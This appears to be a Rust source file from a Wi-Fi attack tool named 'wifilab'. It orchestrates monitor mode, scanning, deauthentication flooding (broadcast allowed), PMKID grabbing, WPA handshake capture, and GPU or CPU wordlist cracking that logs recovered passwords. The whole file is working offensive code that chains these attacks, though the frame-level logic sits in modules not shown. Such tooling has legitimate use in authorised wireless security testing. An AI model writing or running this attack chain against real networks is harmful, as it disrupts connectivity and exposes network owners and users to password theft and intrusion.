//! Backend orchestrator: owns the interface mode switch and every worker
//! thread (scanner, deauth, PMKID grab, 4-way capture, cracker). All
//! workers share a single stop flag and report over the UI event channel;
//! the UI stores one `Backend` and drops/shuts it down on window close.
//!
//! Concurrency notes:
//! - The scanner and any attack worker can coexist (deauth while capturing
//!   is the whole point). Attack workers open their OWN [`RawSocket`] on
//!   the monitor interface and set the channel themselves; concurrent
//!   attacks should therefore target the SAME channel — this matches the
//!   UI, which implies a single target.
//! - `to_monitor` may create a `<orig>mon` vif; the actual monitor ifname
//!   is remembered and passed to [`iface::to_managed`] on shutdown
//!   (it deletes the vif or flips the interface back, as appropriate).

use std::path::PathBuf;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::thread::JoinHandle;

use anyhow::{Context, Result};
use crossbeam_channel::Sender;

use crate::common::{Event, MacAddr};
use crate::crypto::CrackTarget;
use crate::gpu::{self, GpuCracker};
use crate::rawsock::RawSocket;
use crate::{deauth, handshake, iface, pmkid, scanner, wordlist};

fn send(tx: &Sender<Event>, ev: Event) {
    let _ = tx.send(ev);
}

fn log(tx: &Sender<Event>, msg: impl Into<String>) {
    send(tx, Event::Log(msg.into()));
}

fn log_err(tx: &Sender<Event>, msg: impl Into<String>) {
    send(tx, Event::Error(msg.into()));
}

pub struct Backend {
    stop: Arc<AtomicBool>,
    handles: Mutex<Vec<JoinHandle<()>>>,
    /// Name of the interface currently in monitor mode (`None` if the
    /// mode switch failed at start — nothing to restore then).
    mon_ifname: Option<String>,
    /// Interface the user selected; restored to managed mode on shutdown
    /// when it differs from `mon_ifname`.
    orig_ifname: String,
    /// Stop flag of the currently running crack job (if any). Kept
    /// separate from `stop` so "Stop" on the cracker page doesn't kill
    /// the radio workers and `shutdown` can kill both.
    crack_stop: Mutex<Option<Arc<AtomicBool>>>,
}

impl Backend {
    /// Switch `ifname` to monitor mode and start the channel-hopping
    /// scanner (full 2.4 + 5 GHz hop list). On any failure an
    /// [`Event::Error`] is emitted, the interface is put back into managed
    /// mode, and `Err` is returned.
    pub fn start_scan(ifname: &str, tx: Sender<Event>) -> Result<Self> {
        let mon_ifname = match iface::to_monitor(ifname) {
            Ok(name) => name,
            Err(e) => {
                log_err(&tx, format!("monitor mode on {ifname} failed: {e:#}"));
                // Best effort: leave the box the way we found it.
                let _ = iface::to_managed(ifname);
                return Err(e).context(format!("to_monitor({ifname})"));
            }
        };
        let be = Backend {
            stop: Arc::new(AtomicBool::new(false)),
            handles: Mutex::new(Vec::new()),
            mon_ifname: Some(mon_ifname.clone()),
            orig_ifname: ifname.to_string(),
            crack_stop: Mutex::new(None),
        };
        log(&tx, format!("monitor mode up on {mon_ifname} (was {ifname})"));

        let cfg = scanner::ScannerConfig {
            ifname: mon_ifname,
            channels: Vec::new(), // empty = full hop list
            dwell_ms: 100,
            rssi_floor: -95,
        };
        let stop = be.stop.clone();
        let h = std::thread::Builder::new()
            .name("wifilab-scanner".into())
            .spawn(move || {
                if let Err(e) = scanner::run(cfg, tx.clone(), stop) {
                    log_err(&tx, format!("scanner stopped: {e:#}"));
                }
            })
            .context("spawning scanner thread")?;
        be.handles.lock().expect("handles poisoned").push(h);
        Ok(be)
    }

    fn mon(&self) -> String {
        self.mon_ifname
            .clone()
            .unwrap_or_else(|| self.orig_ifname.clone())
    }

    /// Register a worker thread so [`Backend::shutdown`] joins it. The
    /// worker closure takes ownership of an event channel clone; on spawn
    /// failure the error is reported on the caller's `tx`.
    fn spawn(
        &self,
        name: &str,
        tx: &Sender<Event>,
        what: &str,
        f: impl FnOnce(Sender<Event>) + Send + 'static,
    ) -> bool {
        let worker_tx = tx.clone();
        match std::thread::Builder::new()
            .name(name.to_string())
            .spawn(move || f(worker_tx))
        {
            Ok(h) => {
                self.handles.lock().expect("handles poisoned").push(h);
                true
            }
            Err(e) => {
                log_err(tx, format!("{what}: spawn failed: {e}"));
                false
            }
        }
    }

    /// Ask the running crack job (if any) to stop. Independent of the
    /// radio stop flag: killing capture should not need a wordlist stream
    /// to die with it.
    pub fn request_crack_stop(&self) {
        if let Some(flag) = &*self.crack_stop.lock().expect("crack_stop poisoned") {
            flag.store(true, Ordering::Relaxed);
        }
    }

    /// Deauth worker: opens its own raw socket on the monitor interface,
    /// tunes it to `channel`, then blasts `count` deauth rounds at
    /// `target` (broadcast allowed). Emits DeauthSent progress (via
    /// [`deauth::blast`]) and a final summary log.
    pub fn deauth(
        &self,
        ap: MacAddr,
        target: MacAddr,
        channel: u8,
        count: u32,
        tx: Sender<Event>,
    ) {
        let mon = self.mon();
        self.spawn("wifilab-deauth", &tx, "deauth", move |tx| {
            let sock = match RawSocket::open(&mon) {
                Ok(s) => s,
                Err(e) => {
                    log_err(&tx, format!("deauth: raw socket on {mon} failed: {e}"));
                    return;
                }
            };
            if let Err(e) = iface::set_channel(&mon, channel) {
                // Not fatal: the capture worker is usually already parked
                // on the right channel.
                log(&tx, format!("deauth: set_channel {channel} failed: {e:#}"));
            }
            match deauth::blast(&sock, &ap, &target, count, &tx) {
                Ok(sent) => log(&tx, format!("deauth: done, {sent} frames → {target}")),
                Err(e) => log_err(&tx, format!("deauth: {e:#}")),
            }
        });
    }

    /// PMKID grab worker: single client-less auth+assoc attempt against
    /// `ap`, impersonating the monitor interface's own MAC. Emits
    /// PmkidCaptured or a "no PMKID" log line.
    pub fn pmkid(&self, ap: MacAddr, channel: u8, essid: String, tx: Sender<Event>) {
        let mon = self.mon();
        self.spawn("wifilab-pmkid", &tx, "pmkid", move |tx| {
            let sta = match iface::mac_of(&mon) {
                Ok(m) => m,
                Err(e) => {
                    log_err(&tx, format!("pmkid: own MAC of {mon}: {e:#}"));
                    return;
                }
            };
            let sock = match RawSocket::open(&mon) {
                Ok(s) => s,
                Err(e) => {
                    log_err(&tx, format!("pmkid: raw socket on {mon} failed: {e}"));
                    return;
                }
            };
            if let Err(e) = iface::set_channel(&mon, channel) {
                log(&tx, format!("pmkid: set_channel {channel} failed: {e:#}"));
            }
            match pmkid::grab(&sock, &ap, &sta, &essid, &tx) {
                Ok(Some(cap)) => send(&tx, Event::PmkidCaptured(cap)),
                Ok(None) => log(&tx, format!("pmkid: no PMKID volunteered by {ap}")),
                Err(e) => log_err(&tx, format!("pmkid: {e:#}")),
            }
        });
    }

    /// 4-way capture worker: tune the monitor interface to `channel`, open
    /// a raw socket, and run [`handshake::capture_loop`] (stop flag
    /// checked every 250 ms frame poll). [`Event::HandshakeComplete`] is
    /// emitted from inside the loop when a crackable pair completes.
    pub fn capture_hs(&self, ap: MacAddr, channel: u8, essid: String, tx: Sender<Event>) {
        let mon = self.mon();
        let stop = self.stop.clone();
        self.spawn("wifilab-capture", &tx, "handshake", move |tx| {
            if let Err(e) = iface::set_channel(&mon, channel) {
                log_err(&tx, format!("handshake: set_channel {channel} on {mon}: {e:#}"));
                return;
            }
            let sock = match RawSocket::open(&mon) {
                Ok(s) => s,
                Err(e) => {
                    log_err(&tx, format!("handshake: raw socket on {mon} failed: {e}"));
                    return;
                }
            };
            match handshake::capture_loop(&sock, ap, &essid, &tx, &stop) {
                Ok(true) => {}
                Ok(false) => log(&tx, format!("handshake: capture ended without a pair ({ap})")),
                Err(e) => log_err(&tx, format!("handshake: {e:#}")),
            }
        });
    }

    /// Crack worker: stream `wordlist` through the GPU cracker (CPU
    /// fallback when no adapter) against `target`. Emits CrackProgress,
    /// then exactly one terminator: CrackFound + CrackStopped{found:true}
    /// on success, CrackStopped{found:false} on stop or wordlist
    /// exhaustion.
    pub fn crack(
        &self,
        target_desc: String,
        target: CrackTarget,
        wordlist: PathBuf,
        tx: Sender<Event>,
    ) {
        // Cracking has its own stop flag (cracker-page Stop) but shutdown
        // kills it too (see stop_workers/Drop, which set both).
        let stop = Arc::new(AtomicBool::new(false));
        *self.crack_stop.lock().expect("crack_stop poisoned") = Some(stop.clone());
        self.spawn("wifilab-crack", &tx, "cracker", move |tx| {
            let words = match wordlist::open(&wordlist) {
                Ok(w) => w,
                Err(e) => {
                    log_err(&tx, format!("cracker: {e:#}"));
                    send(&tx, Event::CrackStopped { found: false });
                    return;
                }
            };
            let mut words = words;
            let mut progress = {
                let tx = tx.clone();
                move |done: u64, hps: f64| send(&tx, Event::CrackProgress { done, hps })
            };
            let found = match GpuCracker::try_new() {
                Some(g) => {
                    log(
                        &tx,
                        format!("cracker: GPU backend: {} — cracking {target_desc}", g.device_name()),
                    );
                    g.crack(&target, &mut words, &mut progress, &stop)
                }
                None => {
                    log(
                        &tx,
                        format!("cracker: no GPU adapter, CPU fallback — cracking {target_desc}"),
                    );
                    gpu::cpu_crack(&target, &mut words, &mut progress, &stop)
                }
            };
            match found {
                Some(password) => {
                    log(&tx, format!("cracker: PASSWORD found: {password}"));
                    send(&tx, Event::CrackFound { password });
                    send(&tx, Event::CrackStopped { found: true });
                }
                None => {
                    if stop.load(Ordering::Relaxed) {
                        log(&tx, "cracker: stopped");
                    } else {
                        log(&tx, "cracker: wordlist exhausted, password not found");
                    }
                    send(&tx, Event::CrackStopped { found: false });
                }
            }
        });
    }

    /// Stop every worker, restore the original interface to managed mode
    /// (deleting the `<orig>mon` vif if one was created), and join all
    /// threads. Idempotent: safe to call more than once / from `Drop`.
    pub fn shutdown(self) {
        self.stop_workers();
    }

    /// Inner shutdown shared with `Drop` (which cannot move `self`).
    fn stop_workers(&self) {
        self.stop.store(true, Ordering::Release);
        self.request_crack_stop();
        if let Some(mon) = &self.mon_ifname {
            if let Err(e) = iface::to_managed(mon) {
                eprintln!("wifilab: to_managed({mon}) failed: {e:#}");
            }
        }
        let handles = std::mem::take(&mut *self.handles.lock().expect("handles poisoned"));
        for h in handles {
            let _ = h.join();
        }
    }
}

impl Drop for Backend {
    /// Panic-safe mirror of [`Backend::shutdown`] — same steps, ignores
    /// errors silently as far as possible; never panics itself.
    fn drop(&mut self) {
        self.stop.store(true, Ordering::Release);
        self.request_crack_stop();
        if let Some(mon) = &self.mon_ifname {
            let _ = iface::to_managed(mon);
        }
        if let Ok(mut guard) = self.handles.lock() {
            for h in std::mem::take(&mut *guard) {
                let _ = h.join();
            }
        }
    }
}
